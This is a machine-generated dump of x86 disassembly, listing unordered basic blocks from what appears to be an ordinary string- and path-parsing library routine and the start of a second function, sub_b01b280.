0xb01b14b:	mov	dword ptr [esp + 4], eax
0xb01b14f:	mov	dword ptr [esp], edi
0xb01b152:	mov	dword ptr [esp + 8], edx
0xb01b156:	call	0xb094e70
None
|
|
|
v
0xb01af20:	test	edi, edi
0xb01af22:	jne	0xb01af08
None
|
|
|
v
0xb01afba:	test	al, al
0xb01afbc:	lea	esi, dword ptr [ecx + 1]
0xb01afbf:	jne	0xb01afdc
None
|
|
|
v
0xb01ab4f:	mov	eax, dword ptr [ebp - 0x30]
0xb01ab52:	mov	dword ptr [esp + 4], 0x2f
0xb01ab5a:	mov	dword ptr [esp], eax
0xb01ab5d:	call	0xb07a520
None
|
|
|
v
0xb01b057:	mov	ecx, dword ptr [eax + 4]
0xb01b05a:	test	ecx, ecx
0xb01b05c:	jne	0xb01b050
None
|
|
|
v
0xb01ae16:	cmp	byte ptr [eax + 2], 0
0xb01ae1a:	jne	0xb01abf8
None
|
|
|
v
0xb01b06a:	mov	dword ptr [edi + ecx], 0
0xb01b071:	add	ecx, 4
0xb01b074:	cmp	ecx, 0x20
0xb01b077:	jb	0xb01b06a
None
|
|
|
v
0xb01af00:	mov	eax, dword ptr [esi]
0xb01af02:	test	eax, eax
0xb01af04:	jne	0xb01af0a
None
|
|
|
v
0xb01ab25:	add	eax, 1
0xb01ab28:	xor	edi, edi
0xb01ab2a:	mov	dword ptr [esp + 4], 0x2f
0xb01ab32:	mov	dword ptr [esp], eax
0xb01ab35:	call	0xb07a520
None
|
|
|
v
0xb01af38:	mov	eax, dword ptr [ebp - 0x40]
0xb01af3b:	mov	dword ptr [esp], eax
0xb01af3e:	call	0xb017470
None
|
|
|
v
0xb01ac54:	test	eax, eax
0xb01ac56:	jne	0xb01ac38
None
|
|
|
v
0xb01b0b0:	cmp	dl, 0x2c
0xb01b0b3:	lea	ecx, dword ptr [eax + 1]
0xb01b0b6:	je	0xb01b190
None
|
|
|
v
0xb01ae01:	mov	eax, dword ptr [ebp - 0x4c]
0xb01ae04:	mov	edx, dword ptr [ebp - 0x40]
0xb01ae07:	mov	dword ptr [eax], edx
0xb01ae09:	mov	eax, dword ptr [ebp - 0x44]
0xb01ae0c:	lea	esp, dword ptr [ebp - 0xc]
0xb01ae0f:	pop	ebx
0xb01ae10:	pop	esi
0xb01ae11:	pop	edi
0xb01ae12:	pop	ebp
0xb01ae13:	ret	4
None
|
|
|
v
0xb01b0c5:	test	esi, esi
0xb01b0c7:	je	0xb01b105
None
|
|
|
v
0xb01b048:	jmp	0xb01b09b
None
|
|
|
v
0xb01ad90:	mov	ecx, eax
0xb01ad92:	mov	eax, dword ptr [ecx + 0x10]
0xb01ad95:	test	eax, eax
0xb01ad97:	jne	0xb01ad90
None
|
|
|
v
0xb01ae70:	mov	edx, dword ptr [ebx - 0xdc]
0xb01ae76:	mov	eax, dword ptr gs:[0]
0xb01ae7c:	mov	dword ptr [ebp - 0x34], edx
0xb01ae7f:	mov	dword ptr [ebp - 0x3c], eax
0xb01ae82:	mov	eax, dword ptr [eax + edx]
0xb01ae85:	mov	edx, esi
0xb01ae87:	mov	dword ptr [ebp - 0x30], eax
0xb01ae8a:	mov	eax, dword ptr [ebp - 0x24]
0xb01ae8d:	call	0xb01c390
None
|
|
|
v
0xb01add7:	mov	ecx, dword ptr [ebp - 0x34]
0xb01adda:	test	eax, eax
0xb01addc:	mov	dword ptr [ecx - 0x18], eax
0xb01addf:	je	0xb01aec9
None
|
|
|
v
0xb01b15b:	test	eax, eax
0xb01b15d:	je	0xb01b1a6
None
|
|
|
v
0xb01ab95:	cmp	byte ptr [eax + 2], 0
0xb01ab99:	jne	0xb01abe6
None
|
|
|
v
0xb01aafb:	add	ebx, 0x190505
0xb01ab01:	sub	esp, 0x4c
0xb01ab04:	mov	dword ptr [esp + 4], 0x2f
0xb01ab0c:	mov	dword ptr [esp], eax
0xb01ab0f:	mov	dword ptr [ebp - 0x38], eax
0xb01ab12:	mov	dword ptr [ebp - 0x30], edx
0xb01ab15:	mov	dword ptr [ebp - 0x4c], ecx
0xb01ab18:	call	0xb07a520
None
|
|
|
v
0xb01b0be:	movzx	edx, byte ptr [eax]
0xb01b0c1:	test	dl, dl
0xb01b0c3:	jne	0xb01b0b0
None
|
|
|
v
0xb01b079:	lea	ecx, dword ptr [ebx - 0x1d80]
0xb01b07f:	mov	dword ptr [edi + 8], ecx
0xb01b082:	mov	dword ptr [edi + 0xc], 1
0xb01b089:	mov	dword ptr [edi + 0x10], edx
0xb01b08c:	mov	dword ptr [eax + 4], edi
0xb01b08f:	movzx	eax, byte ptr [esi]
0xb01b092:	cmp	al, 0x2c
0xb01b094:	jne	0xb01b0a2
None
|
|
|
v
0xb01b140:	mov	esi, eax
0xb01b142:	mov	eax, dword ptr [esi]
0xb01b144:	test	eax, eax
0xb01b146:	je	0xb01b15f
None
|
|
|
v
0xb01b219:	sub	esp, 0x30
0xb01b21c:	xor	eax, eax
0xb01b21e:	lea	edx, dword ptr [esp + 0x1b]
0xb01b222:	and	edx, 0xfffffff0
0xb01b225:	mov	dword ptr [ebp - 0x34], edx
0xb01b228:	mov	dword ptr [edx + eax], 0
0xb01b22f:	add	eax, 4
0xb01b232:	cmp	eax, 0x20
0xb01b235:	jb	0xb01b228
None
|
|
|
v
0xb01b15f:	mov	eax, dword ptr [esi + 4]
0xb01b162:	test	eax, eax
0xb01b164:	jne	0xb01b140
None
|
|
|
v
0xb01b186:	mov	dword ptr [ecx], edi
0xb01b188:	mov	dword ptr [edx + 4], ecx
0xb01b18b:	jmp	0xb01b09b
None
|
|
|
v
0xb01af18:	mov	dword ptr [esp], eax
0xb01af1b:	call	0xb017470
None
|
|
|
v
0xb01ad30:	mov	ecx, dword ptr [ebp - 0x24]
0xb01ad33:	mov	ecx, dword ptr [ecx + edi + 0x10]
0xb01ad37:	mov	dword ptr [esp + 4], ecx
0xb01ad3b:	lea	ecx, dword ptr [ebp - 0x1c]
0xb01ad3e:	mov	dword ptr [esp], ecx
0xb01ad41:	call	eax
None
|
|
|
v
0xb01af78:	mov	dword ptr [esp], esi
0xb01af7b:	mov	dword ptr [ebp - 0x38], eax
0xb01af7e:	call	0xb07ae80
None
|
|
|
v
0xb01af4b:	mov	edi, dword ptr [ebp - 0x38]
0xb01af4e:	lea	esi, dword ptr [eax + 1]
0xb01af51:	mov	eax, esi
0xb01af53:	sub	eax, edi
0xb01af55:	lea	edx, dword ptr [eax + 0x1f]
0xb01af58:	and	edx, 0xfffffff0
0xb01af5b:	sub	esp, edx
0xb01af5d:	lea	edx, dword ptr [esp + 0x1b]
0xb01af61:	and	edx, 0xfffffff0
0xb01af64:	mov	byte ptr [edx + eax], 0
0xb01af68:	mov	dword ptr [esp], edx
0xb01af6b:	mov	dword ptr [esp + 8], eax
0xb01af6f:	mov	dword ptr [esp + 4], edi
0xb01af73:	call	0xb07d0b0
None
|
|
|
v
0xb01ad43:	test	eax, eax
0xb01ad45:	jne	0xb01ad9e
None
|
|
|
v
0xb01b19a:	mov	dword ptr [ebp - 0x3c], 2
0xb01b1a1:	jmp	0xb01b09b
None
|
|
|
v
0xb01b206:	mov	ecx, dword ptr [eax + 0xc]
0xb01b209:	mov	dword ptr [ebp - 0x38], eax
0xb01b20c:	mov	dword ptr [esp], ecx
0xb01b20f:	call	edx
None
|
|
|
v
0xb01b096:	nop	
None
|
|
|
v
0xb01ae20:	mov	edx, dword ptr gs:[0]
0xb01ae27:	mov	eax, dword ptr [ebx - 0x134]
0xb01ae2d:	mov	eax, dword ptr [edx + eax]
0xb01ae30:	mov	eax, dword ptr [eax]
0xb01ae32:	mov	esi, dword ptr [eax + 0x5c]
0xb01ae35:	mov	dword ptr [esp], esi
0xb01ae38:	call	0xb07ae80
None
|
|
|
v
0xb01ac38:	mov	esi, edi
0xb01ac3a:	mov	edi, eax
0xb01ac3c:	mov	ecx, dword ptr [edi]
0xb01ac3e:	test	ecx, ecx
0xb01ac40:	je	0xb01ac51
None
|
|
|
v
0xb01b05e:	sub	esp, 0x30
0xb01b061:	xor	ecx, ecx
0xb01b063:	lea	edi, dword ptr [esp + 0x1b]
0xb01b067:	and	edi, 0xfffffff0
0xb01b06a:	mov	dword ptr [edi + ecx], 0
0xb01b071:	add	ecx, 4
0xb01b074:	cmp	ecx, 0x20
0xb01b077:	jb	0xb01b06a
None
|
|
|
v
0xb01acbd:	mov	esi, dword ptr [ebp - 0x48]
0xb01acc0:	mov	eax, dword ptr [ebp - 0x34]
0xb01acc3:	test	esi, esi
0xb01acc5:	mov	dword ptr [eax - 4], eax
0xb01acc8:	je	0xb01ada9
None
|
|
|
v
0xb01afe3:	xor	edi, edi
0xb01afe5:	test	ecx, ecx
0xb01afe7:	mov	dword ptr [ebp - 0x3c], 0
0xb01afee:	je	0xb01ab4f
None
|
|
|
v
0xb01b240:	mov	eax, dword ptr [ebp - 0x38]
0xb01b243:	mov	edx, dword ptr [ebp - 0x3c]
0xb01b246:	mov	edi, dword ptr [ebp - 0x40]
0xb01b249:	lea	eax, dword ptr [eax + eax*8]
0xb01b24c:	or	edx, 1
0xb01b24f:	mov	dword ptr [edi + eax*4 + 0x10], edx
0xb01b253:	jmp	0xb01ae01
None
|
|
|
v
0xb01ad9e:	mov	esi, dword ptr [esi + 4]
0xb01ada1:	test	esi, esi
0xb01ada3:	jne	0xb01acd0
None
|
|
|
v
0xb01afcf:	cmp	al, 0x2c
0xb01afd1:	lea	edx, dword ptr [esi + 1]
0xb01afd4:	je	0xb01b1fc
None
|
|
|
v
0xb01af32:	sub	dword ptr [ebp - 0x2c], 1
0xb01af36:	jne	0xb01af00
None
|
|
|
v
0xb01ad53:	test	eax, eax
0xb01ad55:	mov	edx, eax
0xb01ad57:	je	0xb01aec9
None
|
|
|
v
0xb01ab87:	mov	eax, dword ptr [ebp - 0x38]
0xb01ab8a:	cmp	byte ptr [eax], 0x2f
0xb01ab8d:	jne	0xb01abe6
None
|
|
|
v
0xb01ad1e:	mov	esi, edi
0xb01ad20:	mov	edi, ecx
0xb01ad22:	mov	eax, dword ptr [esi + 0x18]
0xb01ad25:	mov	dword ptr [ebp - 0x1c], 0
0xb01ad2c:	test	eax, eax
0xb01ad2e:	je	0xb01ad47
None
|
|
|
v
0xb01ad5d:	mov	eax, dword ptr [esi + 0x10]
0xb01ad60:	mov	dword ptr [edx], eax
0xb01ad62:	mov	eax, dword ptr [esi + 0x14]
0xb01ad65:	mov	dword ptr [edx + 4], eax
0xb01ad68:	mov	eax, dword ptr [esi + 0x1c]
0xb01ad6b:	mov	dword ptr [edx + 0x10], 0
0xb01ad72:	mov	dword ptr [edx + 8], eax
0xb01ad75:	mov	eax, dword ptr [ebp - 0x1c]
0xb01ad78:	mov	dword ptr [edx + 0xc], eax
0xb01ad7b:	mov	eax, dword ptr [ebp - 0x34]
0xb01ad7e:	mov	ecx, dword ptr [eax + 8]
0xb01ad81:	test	ecx, ecx
0xb01ad83:	jne	0xb01ad92
None
|
|
|
v
0xb01acd0:	mov	eax, dword ptr [esi + 0xc]
0xb01acd3:	test	eax, eax
0xb01acd5:	je	0xb01ad9e
None
|
|
|
v
0xb01b1a6:	mov	esi, dword ptr [ebp - 0x48]
0xb01b1a9:	jmp	0xb01b09b
None
|
|
|
v
0xb01b0fd:	mov	dword ptr [ebp - 0x30], eax
0xb01b100:	jmp	0xb01ab87
None
|
|
|
v
0xb01b211:	mov	eax, dword ptr [ebp - 0x38]
0xb01b214:	jmp	0xb01af18
None
|
|
|
v
0xb01ac28:	test	edi, edi
0xb01ac2a:	je	0xb01b1f0
None
|
|
|
v
0xb01ac79:	mov	eax, dword ptr [ebp - 0x24]
0xb01ac7c:	mov	dword ptr [edx], esi
0xb01ac7e:	mov	esi, edx
0xb01ac80:	mov	dword ptr [edx + 4], eax
0xb01ac83:	lea	eax, dword ptr [edx + 8]
0xb01ac86:	mov	dword ptr [esp + 8], edi
0xb01ac8a:	mov	dword ptr [esp + 4], 0
0xb01ac92:	mov	dword ptr [esp], eax
0xb01ac95:	call	0xb07ca20
None
|
|
|
v
0xb01b26c:	mov	dword ptr [ebp - 0x48], eax
0xb01b26f:	xor	edi, edi
0xb01b271:	jmp	0xb01ac54
None
|
|
|
v
0xb01b0d2:	mov	esi, dword ptr [ebp - 0x30]
0xb01b0d5:	add	eax, 1
0xb01b0d8:	sub	eax, esi
0xb01b0da:	lea	edx, dword ptr [eax + 0x1f]
0xb01b0dd:	and	edx, 0xfffffff0
0xb01b0e0:	sub	esp, edx
0xb01b0e2:	lea	edx, dword ptr [esp + 0x1b]
0xb01b0e6:	and	edx, 0xfffffff0
0xb01b0e9:	mov	byte ptr [edx + eax], 0
0xb01b0ed:	mov	dword ptr [esp + 8], eax
0xb01b0f1:	mov	dword ptr [esp + 4], esi
0xb01b0f5:	mov	dword ptr [esp], edx
0xb01b0f8:	call	0xb07d0b0
None
|
|
|
v
0xb01ad17:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01ad1a:	test	eax, eax
0xb01ad1c:	jne	0xb01ace8
None
|
|
|
v
0xb01b105:	mov	edi, dword ptr [ebp - 0x34]
0xb01b108:	jmp	0xb01ab4f
None
|
|
|
v
0xb01ac42:	mov	eax, edi
0xb01ac44:	call	0xb023b00
None
|
|
|
v
0xb01afa5:	mov	ecx, eax
0xb01afa7:	movzx	eax, byte ptr [eax]
0xb01afaa:	cmp	al, 0x2c
0xb01afac:	jne	0xb01afba
None
|
|
|
v
0xb01af83:	lea	edx, dword ptr [eax + 1]
0xb01af86:	add	eax, 0x1f
0xb01af89:	and	eax, 0xfffffff0
0xb01af8c:	sub	esp, eax
0xb01af8e:	lea	eax, dword ptr [esp + 0x1b]
0xb01af92:	and	eax, 0xfffffff0
0xb01af95:	mov	dword ptr [esp + 8], edx
0xb01af99:	mov	dword ptr [esp + 4], esi
0xb01af9d:	mov	dword ptr [esp], eax
0xb01afa0:	call	0xb07d0b0
None
|
|
|
v
0xb01abee:	cmp	byte ptr [eax + 1], 0x2f
0xb01abf2:	je	0xb01ae16
None
|
|
|
v
0xb01b190:	mov	byte ptr [eax], 0
0xb01b193:	mov	eax, ecx
0xb01b195:	jmp	0xb01b0c5
None
|
|
|
v
0xb01ab1d:	test	eax, eax
0xb01ab1f:	je	0xb01afc1
None
|
|
|
v
0xb01b1ae:	sub	esp, 0x30
0xb01b1b1:	xor	edx, edx
0xb01b1b3:	lea	eax, dword ptr [esp + 0x1b]
0xb01b1b7:	and	eax, 0xfffffff0
0xb01b1ba:	mov	dword ptr [ebp - 0x34], eax
0xb01b1bd:	mov	dword ptr [eax + edx], 0
0xb01b1c4:	add	edx, 4
0xb01b1c7:	cmp	edx, 0x20
0xb01b1ca:	jb	0xb01b1bd
None
|
|
|
v
0xb01ab62:	test	eax, eax
0xb01ab64:	je	0xb01ab87
None
|
|
|
v
0xb01af43:	mov	edx, dword ptr [ebp - 0x20]
0xb01af46:	jmp	0xb01ae8a
None
|
|
|
v
0xb01ac58:	mov	esi, dword ptr [ebp - 0x20]
0xb01ac5b:	lea	edi, dword ptr [esi + esi*8]
0xb01ac5e:	shl	edi, 2
0xb01ac61:	lea	eax, dword ptr [edi + 8]
0xb01ac64:	mov	dword ptr [esp], eax
0xb01ac67:	call	0xb0173f0
None
|
|
|
v
0xb01b127:	mov	edx, dword ptr [ebp - 0x34]
0xb01b12a:	test	edx, edx
0xb01b12c:	je	0xb01b219
None
|
|
|
v
0xb01b237:	mov	dword ptr [edx], edi
0xb01b239:	jmp	0xb01b09b
None
|
|
|
v
0xb01ac13:	mov	dword ptr [ebp - 0x40], 0
0xb01ac1a:	sub	esp, 8
0xb01ac1d:	test	eax, eax
0xb01ac1f:	mov	dword ptr [ebp - 0x44], eax
0xb01ac22:	jne	0xb01ae01
None
|
|
|
v
0xb01b02a:	test	eax, eax
0xb01b02c:	jne	0xb01b10d
None
|
|
|
v
0xb01abe6:	mov	eax, dword ptr [ebp - 0x30]
0xb01abe9:	cmp	byte ptr [eax], 0x2f
0xb01abec:	jne	0xb01abf8
None
|
|
|
v
0xb01ada9:	mov	esi, dword ptr [ebp - 0x20]
0xb01adac:	lea	eax, dword ptr [esi - 1]
0xb01adaf:	cmp	eax, dword ptr [ebp - 0x38]
0xb01adb2:	jbe	0xb01b240
None
|
|
|
v
0xb01ad47:	mov	dword ptr [esp], 0x14
0xb01ad4e:	call	0xb0173f0
None
|
|
|
v
0xb01ac49:	test	eax, eax
0xb01ac4b:	jne	0xb01b258
None
|
|
|
v
0xb01ab7d:	cmp	byte ptr [eax + 1], 0
0xb01ab81:	jne	0xb01b0d2
None
|
|
|
v
0xb01b25f:	mov	dword ptr [esi + 4], eax
0xb01b262:	mov	eax, dword ptr [edi + 4]
0xb01b265:	mov	edi, esi
0xb01b267:	jmp	0xb01ac54
None
|
|
|
v
0xb01b228:	mov	dword ptr [edx + eax], 0
0xb01b22f:	add	eax, 4
0xb01b232:	cmp	eax, 0x20
0xb01b235:	jb	0xb01b228
None
|
|
|
v
0xb01b03d:	lea	edx, dword ptr [ebx - 0x187970]
0xb01b043:	cmp	dword ptr [eax + 0x10], edx
0xb01b046:	jne	0xb01b057
None
|
|
|
v
0xb01b09b:	movzx	eax, byte ptr [esi]
0xb01b09e:	cmp	al, 0x2c
0xb01b0a0:	je	0xb01b098
None
|
|
|
v
0xb01af0a:	mov	edx, dword ptr [eax + 8]
0xb01af0d:	mov	edi, dword ptr [eax + 0x10]
0xb01af10:	test	edx, edx
0xb01af12:	jne	0xb01b206
None
|
|
|
v
0xb01b098:	add	esi, 1
0xb01b09b:	movzx	eax, byte ptr [esi]
0xb01b09e:	cmp	al, 0x2c
0xb01b0a0:	je	0xb01b098
None
|
|
|
v
0xb01b1bd:	mov	dword ptr [eax + edx], 0
0xb01b1c4:	add	edx, 4
0xb01b1c7:	cmp	edx, 0x20
0xb01b1ca:	jb	0xb01b1bd
None
|
|
|
v
0xb01ae3d:	lea	edx, dword ptr [eax + 0x21]
0xb01ae40:	and	edx, 0xfffffff0
0xb01ae43:	sub	esp, edx
0xb01ae45:	lea	edx, dword ptr [esp + 0x1b]
0xb01ae49:	and	edx, 0xfffffff0
0xb01ae4c:	mov	dword ptr [esp + 4], esi
0xb01ae50:	mov	esi, 0x2f2f
0xb01ae55:	mov	dword ptr [esp + 8], eax
0xb01ae59:	mov	dword ptr [esp], edx
0xb01ae5c:	mov	dword ptr [ebp - 0x30], edx
0xb01ae5f:	call	0xb07cad0
None
|
|
|
v
0xb01aff4:	lea	eax, dword ptr [ebx - 0xfc0]
0xb01affa:	mov	dword ptr [ebp - 0x2c], eax
0xb01affd:	lea	eax, dword ptr [ebx - 0x49200]
0xb01b003:	mov	dword ptr [ebp - 0x40], eax
0xb01b006:	lea	eax, dword ptr [ebx - 0x4b0b3]
0xb01b00c:	mov	dword ptr [ebp - 0x34], edi
0xb01b00f:	mov	edi, ecx
0xb01b011:	mov	dword ptr [ebp - 0x44], eax
0xb01b014:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b017:	mov	dword ptr [esp], edi
0xb01b01a:	mov	dword ptr [esp + 8], eax
0xb01b01e:	mov	eax, dword ptr [ebp - 0x40]
0xb01b021:	mov	dword ptr [esp + 4], eax
0xb01b025:	call	0xb094e70
None
|
|
|
v
0xb01ab79:	test	eax, eax
0xb01ab7b:	je	0xb01ab87
None
|
|
|
v
0xb01b132:	mov	dword ptr [ebp - 0x48], esi
0xb01b135:	mov	esi, edx
0xb01b137:	jmp	0xb01b142
None
|
|
|
v
0xb01ac9a:	mov	edx, dword ptr [ebp - 0x20]
0xb01ac9d:	test	edx, edx
0xb01ac9f:	je	0xb01ae01
None
|
|
|
v
0xb01b177:	mov	dword ptr [ecx + eax], 0
0xb01b17e:	add	eax, 4
0xb01b181:	cmp	eax, 0x20
0xb01b184:	jb	0xb01b177
None
|
|
|
v
0xb01b123:	test	eax, eax
0xb01b125:	je	0xb01b19a
None
|
|
|
v
0xb01b014:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b017:	mov	dword ptr [esp], edi
0xb01b01a:	mov	dword ptr [esp + 8], eax
0xb01b01e:	mov	eax, dword ptr [ebp - 0x40]
0xb01b021:	mov	dword ptr [esp + 4], eax
0xb01b025:	call	0xb094e70
None
|
|
|
v
0xb01ae8a:	mov	eax, dword ptr [ebp - 0x24]
0xb01ae8d:	call	0xb01c390
None
|
|
|
v
0xb01b050:	cmp	dword ptr [ecx + 0x10], edx
0xb01b053:	je	0xb01b09b
None
|
|
|
v
0xb01ace8:	add	esi, 1
0xb01aceb:	cmp	dword ptr [edi + 0xc], esi
0xb01acee:	jbe	0xb01aeb8
None
|
|
|
v
0xb01aec1:	lea	ecx, dword ptr [eax + 8]
0xb01aec4:	jmp	0xb01ad9c
None
|
|
|
v
0xb01ad9c:	mov	dword ptr [ecx], edx
0xb01ad9e:	mov	esi, dword ptr [esi + 4]
0xb01ada1:	test	esi, esi
0xb01ada3:	jne	0xb01acd0
None
|
|
|
v
0xb01ade5:	mov	edx, dword ptr [ebp - 0x2c]
0xb01ade8:	add	edi, 0x3c
0xb01adeb:	add	dword ptr [ebp - 0x38], 1
0xb01adef:	add	dword ptr [ebp - 0x34], 0x24
0xb01adf3:	add	eax, edx
0xb01adf5:	cmp	esi, dword ptr [ebp - 0x38]
0xb01adf8:	mov	dword ptr [ecx - 0x14], eax
0xb01adfb:	ja	0xb01acbd
None
|
|
|
v
0xb01ac30:	mov	dword ptr [ebp - 0x48], edi
0xb01ac33:	xor	esi, esi
0xb01ac35:	jmp	0xb01ac3c
None
|
|
|
v
0xb01b1f0:	mov	dword ptr [ebp - 0x48], 0
0xb01b1f7:	jmp	0xb01ac58
None
|
|
|
v
0xb01aeb8:	mov	esi, edi
0xb01aeba:	mov	edi, ecx
0xb01aebc:	jmp	0xb01ad9e
None
|
|
|
v
0xb01aca5:	lea	eax, dword ptr [esi + 0x20]
0xb01aca8:	xor	edi, edi
0xb01acaa:	mov	dword ptr [ebp - 0x34], eax
0xb01acad:	lea	eax, dword ptr [ebx - 0xfc0]
0xb01acb3:	mov	dword ptr [ebp - 0x38], 0
0xb01acba:	mov	dword ptr [ebp - 0x30], eax
0xb01acbd:	mov	esi, dword ptr [ebp - 0x48]
0xb01acc0:	mov	eax, dword ptr [ebp - 0x34]
0xb01acc3:	test	esi, esi
0xb01acc5:	mov	dword ptr [eax - 4], eax
0xb01acc8:	je	0xb01ada9
None
|
|
|
v
0xb01acf4:	mov	eax, dword ptr [ebp - 0x30]
0xb01acf7:	mov	dword ptr [ebp - 0x2c], ecx
0xb01acfa:	mov	dword ptr [esp + 8], eax
0xb01acfe:	mov	eax, dword ptr [edi + 8]
0xb01ad01:	mov	eax, dword ptr [eax + esi*4]
0xb01ad04:	mov	dword ptr [esp + 4], eax
0xb01ad08:	mov	eax, dword ptr [ebp - 0x24]
0xb01ad0b:	mov	eax, dword ptr [eax + ecx + 0xc]
0xb01ad0f:	mov	dword ptr [esp], eax
0xb01ad12:	call	0xb094e70
None
|
|
|
v
0xb01b142:	mov	eax, dword ptr [esi]
0xb01b144:	test	eax, eax
0xb01b146:	je	0xb01b15f
None
|
|
|
v
0xb01ac3c:	mov	ecx, dword ptr [edi]
0xb01ac3e:	test	ecx, ecx
0xb01ac40:	je	0xb01ac51
None
|
|
|
v
0xb01ad85:	jmp	0xb01aec1
None
|
|
|
v
0xb01abda:	mov	edx, 0x2f2f
0xb01abdf:	mov	word ptr [eax], dx
0xb01abe2:	mov	byte ptr [eax + 2], 0
0xb01abe6:	mov	eax, dword ptr [ebp - 0x30]
0xb01abe9:	cmp	byte ptr [eax], 0x2f
0xb01abec:	jne	0xb01abf8
None
|
|
|
v
0xb01afc1:	xor	edi, edi
0xb01afc3:	mov	dword ptr [ebp - 0x3c], 0
0xb01afca:	jmp	0xb01ab4f
None
|
|
|
v
0xb01af24:	mov	eax, dword ptr [esi - 0x20]
0xb01af27:	sub	esi, 0x24
0xb01af2a:	mov	dword ptr [esp], eax
0xb01af2d:	call	0xb017470
None
|
|
|
v
0xb01ad92:	mov	eax, dword ptr [ecx + 0x10]
0xb01ad95:	test	eax, eax
0xb01ad97:	jne	0xb01ad90
None
|
|
|
v
0xb01ab8f:	cmp	byte ptr [eax + 1], 0x2f
0xb01ab93:	jne	0xb01abe6
None
|
|
|
v
0xb01ae64:	mov	word ptr [eax], si
0xb01ae67:	mov	byte ptr [eax + 2], 0
0xb01ae6b:	jmp	0xb01abf8
None
|
|
|
v
0xb01aec9:	mov	edx, dword ptr [ebx - 0xdc]
0xb01aecf:	mov	eax, dword ptr gs:[0]
0xb01aed5:	mov	dword ptr [ebp - 0x34], edx
0xb01aed8:	mov	dword ptr [ebp - 0x3c], eax
0xb01aedb:	mov	eax, dword ptr [eax + edx]
0xb01aede:	mov	edx, dword ptr [ebp - 0x38]
0xb01aee1:	mov	dword ptr [ebp - 0x30], eax
0xb01aee4:	mov	eax, edx
0xb01aee6:	sub	eax, 1
0xb01aee9:	test	edx, edx
0xb01aeeb:	je	0xb01af38
None
|
|
|
v
0xb01afae:	nop	
None
|
|
|
v
0xb01b0a6:	lea	eax, dword ptr [esi + 1]
0xb01b0a9:	jmp	0xb01b0be
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01b280
TOTAL BLOCKS :51
0xb01b46f:	add	esp, 0x4c
0xb01b472:	mov	eax, edx
0xb01b474:	pop	ebx
0xb01b475:	pop	esi
0xb01b476:	pop	edi
0xb01b477:	pop	ebp
0xb01b478:	ret	0xc
None
|
|
|
v
0xb01b2ca:	mov	eax, dword ptr [esp + 0x60]
0xb01b2ce:	mov	ecx, dword ptr [eax]
0xb01b2d0:	lea	eax, dword ptr [edx + edx*8]
0xb01b2d3:	lea	eax, dword ptr [esi + eax*4]
0xb01b2d6:	mov	edi, eax
0xb01b2d8:	mov	dword ptr [eax + 8], ecx
0xb01b2db:	mov	dword ptr [esp + 0x3c], eax
0xb01b2df:	mov	eax, dword ptr [esp + 0x64]
0xb01b2e3:	mov	dword ptr [edi + 0xc], eax
0xb01b2e6:	mov	eax, dword ptr [esi + 4]
0xb01b2e9:	mov	edi, dword ptr [eax + 0x14]
0xb01b2ec:	mov	eax, dword ptr [eax]
0xb01b2ee:	test	eax, eax
0xb01b2f0:	je	0xb01b2fc
None
|
|
|
v
0xb01b349:	mov	ecx, dword ptr [esi + 4]
0xb01b34c:	mov	esi, dword ptr [ecx + 0x24]
0xb01b34f:	add	esi, edx
0xb01b351:	cmp	dword ptr [esp + 0x2c], esi
0xb01b355:	jb	0xb01b3a8
None
|
|
|
v
0xb01b488:	mov	edx, eax
0xb01b48a:	jmp	0xb01b3c5
None
|
|
|
v
0xb01b52a:	mov	eax, dword ptr [ebp + 8]
0xb01b52d:	mov	edi, dword ptr [ebp + 0x10]
0xb01b530:	test	eax, eax
0xb01b532:	jne	0xb01b581
None
|
|
|
v
0xb01b56c:	mov	edx, dword ptr [esp + 0xc]
0xb01b570:	mov	eax, dword ptr [esp + 8]
0xb01b574:	call	0xb01c390
None
|
|
|
v
0xb01b280:	push	ebp
0xb01b281:	push	edi
0xb01b282:	push	esi
0xb01b283:	mov	esi, eax
0xb01b285:	push	ebx
0xb01b286:	sub	esp, 0x4c
0xb01b289:	call	0xb1267db
None
|
|
|
v
0xb01b461:	mov	ecx, dword ptr [esp + 0x60]
0xb01b465:	mov	edx, eax
0xb01b467:	test	ecx, ecx
0xb01b469:	jne	0xb01b3a8
None
|
|
|
v
0xb01b3c5:	add	esp, 0x4c
0xb01b3c8:	mov	eax, edx
0xb01b3ca:	pop	ebx
0xb01b3cb:	pop	esi
0xb01b3cc:	pop	edi
0xb01b3cd:	pop	ebp
0xb01b3ce:	ret	0xc
None
|
|
|
v
0xb01b480:	xor	ecx, ecx
0xb01b482:	jmp	0xb01b2d0
None
|
|
|
v
0xb01b357:	mov	dword ptr [esp + 0x30], edx
0xb01b35b:	mov	dword ptr [esp], edi
0xb01b35e:	call	0xb123900
None
|
|
|
v
0xb01b48f:	lea	eax, dword ptr [ebx - 0x4b088]
0xb01b495:	mov	dword ptr [esp + 0xc], eax
0xb01b499:	lea	eax, dword ptr [ebx - 0x4b0ac]
0xb01b49f:	mov	dword ptr [esp + 4], eax
0xb01b4a3:	lea	eax, dword ptr [ebx - 0x46820]
0xb01b4a9:	mov	dword ptr [esp + 8], 0x4a
0xb01b4b1:	mov	dword ptr [esp], eax
0xb01b4b4:	call	0xb027820
None
|
|
|
v
0xb01b3b6:	mov	edi, dword ptr [esp + 0x3c]
0xb01b3ba:	mov	edx, dword ptr [edi + 8]
0xb01b3bd:	mov	edi, dword ptr [esp + 0x60]
0xb01b3c1:	mov	dword ptr [edi], edx
0xb01b3c3:	mov	edx, eax
0xb01b3c5:	add	esp, 0x4c
0xb01b3c8:	mov	eax, edx
0xb01b3ca:	pop	ebx
0xb01b3cb:	pop	esi
0xb01b3cc:	pop	edi
0xb01b3cd:	pop	ebp
0xb01b3ce:	ret	0xc
None
|
|
|
v
0xb01b4b9:	lea	eax, dword ptr [ebx - 0x4b088]
0xb01b4bf:	mov	dword ptr [esp + 0xc], eax
0xb01b4c3:	lea	eax, dword ptr [ebx - 0x4b0ac]
0xb01b4c9:	mov	dword ptr [esp + 4], eax
0xb01b4cd:	lea	eax, dword ptr [ebx - 0x4b0a4]
0xb01b4d3:	mov	dword ptr [esp + 8], 0x2c
0xb01b4db:	mov	dword ptr [esp], eax
0xb01b4de:	call	0xb027820
None
|
|
|
v
0xb01b53c:	test	edi, edi
0xb01b53e:	jne	0xb01b528
None
|
|
|
v
0xb01b446:	mov	edx, dword ptr [esp + 0x2c]
0xb01b44a:	test	eax, eax
0xb01b44c:	jne	0xb01b461
None
|
|
|
v
